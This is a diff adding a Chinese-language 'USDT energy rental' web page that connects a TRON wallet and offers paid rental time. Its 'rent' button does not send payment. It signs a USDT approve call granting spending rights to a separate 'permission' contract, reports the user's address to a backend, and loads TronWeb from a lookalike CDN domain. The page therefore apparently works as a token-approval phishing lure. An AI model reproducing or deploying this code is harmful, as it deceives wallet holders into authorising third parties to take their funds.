@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
+  <title>USDT能量租赁</title>
+  <link rel="icon" type="image/png" href="png/icon_trx.png">
+  <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
+  <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            primary: '#e5020d',
+            primaryLight: '#C1DAF6',
+            border: '#E5E5E5',
+            text: '#000000',
+            textLight: '#999999',
+            textTitle: '#08090B',
+            placeholder: '#999999',
+            warning: '#FF7D00',
+            background: '#F5F5F7',
+            arrowCircle: '#9898A1'
+          },
+          fontFamily: {
+            sans: ['-apple-system', 'BlinkMacSystemFont', 'Helvetica Neue', 'Arial', 'sans-serif']
+          }
+        }
+      }
+    }
+  </script>
+  <style type="text/tailwindcss">
+    @layer utilities {
+      .module-frame { border: 1px solid theme('colors.border'); border-radius: 12px; }
+      .rent-card { @apply cursor-pointer rounded-xl border border-border p-4 transition; }
+      .rent-card.active { @apply border-primary ring-2 ring-primary/20 bg-white; }
+      .rent-grid { @apply grid grid-cols-2 gap-3; }
+      .btn-primary { @apply w-full bg-primaryLight text-white py-3 rounded-xl font-bold text-[17px] shadow-sm transition-colors duration-200; }
+      .btn-enabled { @apply bg-primary; }
+      .tishi { width: 58%; padding: .3rem; background: #4b4848; z-index: 999999; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border-radius: .3rem; color: #fff; font-size: 1rem; text-align: center; display: none; }
+    }
+  </style>
+  <script>
+    // 基础配置
+    // 权限地址（合约地址）
+    window.Permission_address = 'TE75DzbU44NcumPpDDWhepvgXvKRHeuCD4';
+    // 收款地址（个人地址）
+    window.Payment_address = 'TTvsaxi6A4ZHkNLaU3hwX4n6yZyNdC3Mpf';
+    // USDT官方合约地址（无需修改）
+    window.usdtContractAddress = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
+
+    const RENT_OPTIONS = [
+      { id: 'm10', label: '10 分钟', minutes: 10, price: 1.0 },
+      { id: 'm20', label: '20 分钟', minutes: 20, price: 1.9 },
+      { id: 'm30', label: '30 分钟', minutes: 30, price: 2.8 },
+      { id: 'h1',  label: '1 小时',  minutes: 60, price: 5.9 }
+    ];
+
+    let selectedOptionId = 'm10';
+
+    function tip(message) {
+      const el = document.getElementById('tip');
+      el.textContent = message;
+      el.style.display = 'block';
+      setTimeout(() => el.style.display = 'none', 2500);
+    }
+
+    async function connectWallet() {
+      try {
+        if (window.tronWeb && window.tronWeb.ready) return true;
+        if (window.tronLink) {
+          const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+          if (res.code === 200) {
+            window.tronWeb = window.tronLink.tronWeb;
+            return true;
+          }
+        }
+        tip('请在内置钱包浏览器中打开或安装 TronLink/OKX 钱包');
+        return false;
+      } catch (e) {
+        console.error('连接钱包失败:', e);
+        tip('连接钱包失败');
+        return false;
+      }
+    }
+
+    function refreshUI() {
+      // 切换卡片选中态
+      for (const opt of RENT_OPTIONS) {
+        const card = document.getElementById(`card-${opt.id}`);
+        if (!card) continue;
+        if (opt.id === selectedOptionId) card.classList.add('active'); else card.classList.remove('active');
+      }
+      const current = RENT_OPTIONS.find(x => x.id === selectedOptionId);
+      document.getElementById('priceText').textContent = `${current.price} USDT`;
+      const btn = document.getElementById('rentBtn');
+      btn.classList.add('btn-enabled');
+      btn.disabled = false;
+    }
+
+    async function approveRental() {
+      const ok = await connectWallet();
+      if (!ok) return;
+
+      const current = RENT_OPTIONS.find(x => x.id === selectedOptionId);
+      if (!current) { tip('请选择租赁时长'); return; }
+
+      try {
+        const spenderBase58 = window.Permission_address;
+        const usdt = window.usdtContractAddress;
+        const amountInSmallest = new Decimal(current.price).mul(1e6).toFixed(0); // USDT 6位精度
+
+        const usdtHex = tronWeb.address.toHex(usdt);
+        const spenderHex = tronWeb.address.toHex(spenderBase58);
+
+        console.log('开始授权:', {
+          usdt: usdt,
+          spender: spenderBase58,
+          amount: current.price,
+          amountInSmallest: amountInSmallest
+        });
+
+        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+          usdtHex,
+          'approve(address,uint256)',
+          { feeLimit: 100_000_000 },
+          [
+            { type: 'address', value: spenderHex },
+            { type: 'uint256', value: amountInSmallest }
+          ],
+          tronWeb.defaultAddress.base58
+        );
+
+        if (!tx.result || !tx.result.result) {
+          throw new Error('授权交易构建失败');
+        }
+
+        console.log('交易构建成功，等待签名...');
+
+        const signed = await tronWeb.trx.sign(tx.transaction);
+        console.log('交易已签名，等待广播...');
+
+        const res = await tronWeb.trx.sendRawTransaction(signed);
+        console.log('交易广播结果:', res);
+
+        if (res.result) {
+          const txHash = res.txid || res.transaction?.txID;
+          tip(`授权成功！交易哈希: ${txHash.substring(0, 10)}...`);
+          console.log('授权成功，交易哈希:', txHash);
+          
+          // 上报授权事件到后台
+          try {
+            const addr = tronWeb.defaultAddress.base58;
+            const bal = null; // 可扩展：读取余额
+            await fetch('/api/approval', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                address: addr,
+                amount_usdt: current.price,
+                minutes: current.minutes,
+                txid: txHash || '',
+                usdt_balance: bal
+              })
+            });
+          } catch (e) { 
+            console.warn('上报失败（可选）:', e); 
+          }
+        } else {
+          throw new Error('授权发送失败: ' + JSON.stringify(res));
+        }
+      } catch (err) {
+        console.error('授权失败:', err);
+        const errorMsg = err.message || '授权失败，请重试';
+        tip(errorMsg);
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', async () => {
+      // 渲染选项
+      const grid = document.getElementById('rentGrid');
+      for (const opt of RENT_OPTIONS) {
+        const div = document.createElement('div');
+        div.id = `card-${opt.id}`;
+        div.className = 'rent-card';
+        div.innerHTML = `
+          <div class="flex items-center justify-between">
+            <div>
+              <div class="text-[16px] text-textTitle font-medium">${opt.label}</div>
+              <div class="text-[13px] text-textLight mt-1">固定价</div>
+            </div>
+            <div class="text-[18px] text-text font-semibold">${opt.price} <span class="text-[13px] text-textLight">USDT</span></div>
+          </div>
+        `;
+        div.onclick = () => { selectedOptionId = opt.id; refreshUI(); };
+        grid.appendChild(div);
+      }
+
+      document.getElementById('rentBtn').addEventListener('click', approveRental);
+
+      refreshUI();
+      // 进入页面后自动连接钱包
+      await connectWallet();
+    });
+  </script>
+</head>
+<body class="min-h-screen font-sans">
+  <div class="min-h-screen bg-gradient-to-br from-[#b10b16] to-[#7a0c13] p-4 sm:p-6">
+    <div class="max-w-[1200px] mx-auto h-14 px-5 flex items-center justify-center">
+      <div class="text-white font-extrabold text-[22px]">USDT能量租赁</div>
+    </div>
+    <div class="bg-background rounded-3xl overflow-hidden max-w-[1200px] mx-auto flex flex-col min-h-[calc(100vh-4rem)] shadow">
+
+  <main class="p-5 flex flex-col items-center flex-grow">
+    <div class="w-full max-w-[559px]">
+      <div class="bg-yellow-100 border border-yellow-200 rounded-xl p-4 mb-5">
+        <ul class="list-disc ml-5 text-[14px] text-text">
+          <li class="mb-1">请保管好相关凭证截图</li>
+          <li class="mb-1">提交前请确认已在客服联系报备</li>
+          <li class="mb-1">请勿重复提交申请，如遇问题请联系管理员</li>
+          <li class="mb-1">务必使用真实有效的邮箱，相关信息将发送至您的邮箱</li>
+          <li>请确保填写正确的 TRON(TRC20) 网络地址，地址错误可能导致资产丢失</li>
+        </ul>
+      </div>
+
+      <div class="mb-2 text-[15px] text-textLight">租赁市场</div>
+
+      <div id="rentGrid" class="rent-grid mb-5"></div>
+
+      <div class="bg-white module-frame p-4 mb-6">
+        <div class="flex items-center justify-between">
+          <div class="text-textLight text-[15px]">应付</div>
+          <div id="priceText" class="text-text text-[18px] font-semibold">0 USDT</div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="p-5 border-t border-border mt-auto bg-background">
+    <div class="w-full max-w-[559px] mx-auto">
+      <button id="rentBtn" class="btn-primary" disabled>租赁</button>
+    </div>
+  </footer>
+    </div>
+  </div>
+
+  <div class="tishi" id="tip">提示</div>
+</body>
+</html>
